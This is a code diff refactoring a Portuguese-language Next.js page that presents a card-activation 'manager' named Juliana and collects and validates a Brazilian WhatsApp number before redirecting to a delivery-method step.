@@ -2,24 +2,25 @@
 
 import type React from "react"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { useRouter } from "next/navigation"
 import Image from "next/image"
+import { Trophy } from "lucide-react"
 
 export default function ManagerPage() {
   const [whatsapp, setWhatsapp] = useState("")
   const [isValid, setIsValid] = useState(false)
   const router = useRouter()
 
-  // Format WhatsApp number
+  // Formatação do WhatsApp
   const formatWhatsApp = (value: string) => {
-    // Remove all non-digits
-    const digits = value.replace(/\D/g, "")
+    // Remove tudo que não é número
+    const numbers = value.replace(/\D/g, "")
 
-    // Limit to 11 digits (Brazilian format)
-    const limited = digits.slice(0, 11)
+    // Limita a 11 dígitos
+    const limited = numbers.slice(0, 11)
 
-    // Format as (XX) XXXXX-XXXX
+    // Aplica a formatação (XX) XXXXX-XXXX
     if (limited.length <= 2) {
       return limited
     } else if (limited.length <= 7) {
@@ -29,43 +30,40 @@ export default function ManagerPage() {
     }
   }
 
-  // Validate WhatsApp number (11 digits)
-  const validateWhatsApp = (value: string) => {
-    const digits = value.replace(/\D/g, "")
-    return digits.length === 11
-  }
+  // Validação do WhatsApp
+  useEffect(() => {
+    const numbers = whatsapp.replace(/\D/g, "")
+    setIsValid(numbers.length === 11)
+  }, [whatsapp])
 
   const handleWhatsAppChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const formatted = formatWhatsApp(e.target.value)
     setWhatsapp(formatted)
-    setIsValid(validateWhatsApp(formatted))
   }
 
   const handleContinue = () => {
     if (isValid) {
-      // Save WhatsApp to localStorage
-      localStorage.setItem("whatsapp", whatsapp)
-      // Redirect to delivery method
+      // Salvar WhatsApp no localStorage
+      const numbers = whatsapp.replace(/\D/g, "")
+      localStorage.setItem("managerWhatsApp", numbers)
+
+      // Redirecionar para delivery-method
       router.push("/delivery-method")
     }
   }
 
   return (
     <div className="min-h-screen bg-[#f2f2f2] font-sans">
-      {/* Main Content */}
       <div className="px-5 py-5 max-w-2xl mx-auto">
         <div className="bg-white rounded-xl shadow-lg p-5">
-          {/* Title */}
           <h1 className="text-2xl font-bold text-gray-800 mb-3 text-center mt-0">Ótimo, quase lá!</h1>
 
-          {/* Subtitle */}
           <p className="text-sm text-gray-600 mb-5 text-center leading-relaxed">
             Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!
           </p>
 
-          {/* Manager Card */}
+          {/* Card da Gerente */}
           <div className="bg-[#fff7db] border border-[#ffbf00] rounded-xl p-5 pb-3 mb-5">
-            {/* Manager Photo */}
             <div className="flex justify-center mb-3">
               <Image
                 src="/gerente-juliana.png"
@@ -77,46 +75,20 @@ export default function ManagerPage() {
               />
             </div>
 
-            {/* Manager Info */}
             <p className="text-gray-600 text-sm text-center mb-1">Gerente</p>
             <p className="text-[#ffbf00] font-bold text-lg text-center -mt-1 mb-2">Juliana Benedito</p>
 
-            {/* Badge */}
             <div className="flex justify-center mt-0">
               <div className="bg-[#ffbf00] text-white px-3 py-1 rounded-full text-xs font-bold flex items-center">
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  width="24"
-                  height="24"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="2"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                  className="w-3 h-3 mr-1"
-                >
-                  <path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"></path>
-                  <path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"></path>
-                  <path d="M4 22h16"></path>
-                  <path d="M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22"></path>
-                  <path d="M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22"></path>
-                  <path d="M18 2H6v7a6 6 0 0 0 12 0V2Z"></path>
-                </svg>
+                <Trophy className="w-3 h-3 mr-1" />
                 Melhor gerente 2021-2024
               </div>
             </div>
           </div>
 
-          {/* WhatsApp Input */}
+          {/* Campo WhatsApp */}
           <div className="flex items-center justify-center mb-2">
-            <Image
-              src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"
-              alt="WhatsApp"
-              width={20}
-              height={20}
-              className="mr-3"
-            />
+            <Image src="/placeholder.svg?height=20&width=20" alt="WhatsApp" width={20} height={20} className="mr-3" />
             <input
               type="tel"
               className="flex h-10 w-full px-3 py-2 border-0 border-b border-gray-300 rounded-none bg-transparent text-base font-sans focus:border-gray-400 focus:ring-0 flex-1 focus:outline-none"
@@ -134,15 +106,15 @@ export default function ManagerPage() {
             />
           </div>
 
-          {/* Continue Button */}
+          {/* Botão Continuar */}
           <button
+            onClick={handleContinue}
+            disabled={!isValid}
             className={`w-full font-bold py-4 px-6 rounded-lg text-base transition-colors ${
               isValid
                 ? "bg-black text-white hover:bg-black/90 cursor-pointer"
                 : "bg-gray-300 text-gray-500 cursor-not-allowed"
             }`}
-            disabled={!isValid}
-            onClick={handleContinue}
           >
             Continuar
           </button>
